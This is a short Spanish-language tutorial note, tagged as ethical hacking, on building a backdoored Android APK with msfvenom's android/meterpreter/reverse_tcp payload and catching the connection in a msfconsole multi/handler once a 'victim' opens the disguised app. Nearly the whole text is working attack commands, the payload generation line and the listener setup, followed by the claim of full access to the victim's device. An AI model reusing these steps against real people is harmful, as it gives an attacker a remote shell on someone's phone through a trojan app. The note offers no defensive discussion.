#CreacionBackdoors #HackingEtico 

Para crear esta apk maliciosa vamos a ultilizar la herramienta de *MSFVENON* con el payload *android/meterpreter/reverse_tcp*, a continuacion un poco mas.

```bash 
msfvenom -p android/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -o Nombre.apk
```

![[Pasted image 20240114142439.png]]

Después de esto vamos a entablar nos por escucha en msfconsole, configurando todos los parámetros anteriores. Para cuando nuestra vicitima habra nuestra supuesta aplicacion tener accesos total a esta misma.

```bash 
msfconsole
use /multi/handler
show options
set LHOST IP
set LPORT PORT
set PAYLOAD /android/meterpreter/reverse_tcp
run
```

![[Pasted image 20240114145231.png]]
![[Pasted image 20240114145514.png]]
Ya tenemos acceso al dispositivo de nuestra vicitima. para ver todo los comandos a los que tenemos acceso solo vasta con escribir en la terminal.

```bash 
help
```

![[Pasted image 20240114145647.png]]
